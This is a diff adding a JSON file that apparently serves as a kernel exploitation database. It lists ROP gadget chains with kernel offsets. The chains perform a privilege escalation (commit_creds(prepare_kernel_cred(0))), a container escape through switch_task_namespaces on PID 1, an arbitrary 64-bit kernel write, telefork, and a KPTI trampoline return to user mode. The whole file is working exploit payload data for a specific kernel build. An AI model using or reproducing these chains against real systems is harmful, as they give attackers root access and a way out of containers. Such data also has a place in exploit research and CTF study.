@@ -1,0 +1,163 @@
+[
+    {
+        "type_id": 1,
+        "description": "msleep(ARG_time_msec)",
+        "gadgets": [
+            {
+                "kernel_offset": 8682,
+                "description": "pop rdi"
+            },
+            {
+                "argument_index": 0
+            },
+            {
+                "kernel_offset": 2265824,
+                "description": "msleep()"
+            }
+        ]
+    },
+    {
+        "type_id": 2,
+        "description": "commit_kernel_cred(prepare_kernel_cred(0))",
+        "gadgets": [
+            {
+                "kernel_offset": 8682,
+                "description": "pop rdi"
+            },
+            {
+                "value": 0
+            },
+            {
+                "kernel_offset": 1830832,
+                "description": "prepare_kernel_cred()"
+            },
+            {
+                "kernel_offset": 2390333,
+                "description": "mov rdi, rax"
+            },
+            {
+                "kernel_offset": 1830160,
+                "description": "commit_creds()"
+            }
+        ]
+    },
+    {
+        "type_id": 4,
+        "description": "switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)",
+        "gadgets": [
+            {
+                "kernel_offset": 8682,
+                "description": "pop rdi"
+            },
+            {
+                "argument_index": 0
+            },
+            {
+                "kernel_offset": 1791488,
+                "description": "find_task_by_vpid()"
+            },
+            {
+                "kernel_offset": 2390333,
+                "description": "mov rdi, rax"
+            },
+            {
+                "kernel_offset": 9580,
+                "description": "pop rsi"
+            },
+            {
+                "kernel_offset": 40330688,
+                "description": "init_nsproxy()"
+            },
+            {
+                "kernel_offset": 1823104,
+                "description": "switch_task_namespaces()"
+            }
+        ]
+    },
+    {
+        "type_id": 4,
+        "description": "write_what_where_64(ARG_address, ARG_new_value)",
+        "gadgets": [
+            {
+                "kernel_offset": 8682,
+                "description": "pop rdi"
+            },
+            {
+                "argument_index": 0
+            },
+            {
+                "kernel_offset": 9580,
+                "description": "pop rsi"
+            },
+            {
+                "argument_index": 1
+            },
+            {
+                "kernel_offset": 3091897,
+                "description": "mov qword ptr [rdi], rsi"
+            }
+        ]
+    },
+    {
+        "type_id": 5,
+        "description": "fork()",
+        "gadgets": [
+            {
+                "kernel_offset": 1632512,
+                "description": "__do_sys_fork()"
+            }
+        ]
+    },
+    {
+        "type_id": 6,
+        "description": "telefork(ARG_time_msec=5000)",
+        "gadgets": [
+            {
+                "kernel_offset": 1632512,
+                "description": "__do_sys_fork()"
+            },
+            {
+                "kernel_offset": 8682,
+                "description": "pop rdi"
+            },
+            {
+                "argument_index": 0
+            },
+            {
+                "kernel_offset": 2265824,
+                "description": "msleep()"
+            }
+        ]
+    },
+    {
+        "type_id": 7,
+        "description": "ret_via_kpti_retpoline(ARG_user_rip, ARG_user_cs, ARG_user_rflags, ARG_user_sp, ARG_user_ss)",
+        "gadgets": [
+            {
+                "kernel_offset": 18878662,
+                "description": "kpti_trampoline()"
+            },
+            {
+                "value": 0
+            },
+            {
+                "value": 0
+            },
+            {
+                "argument_index": 0
+            },
+            {
+                "argument_index": 1
+            },
+            {
+                "argument_index": 2
+            },
+            {
+                "argument_index": 3
+            },
+            {
+                "argument_index": 4
+            }
+        ]
+    }
+]
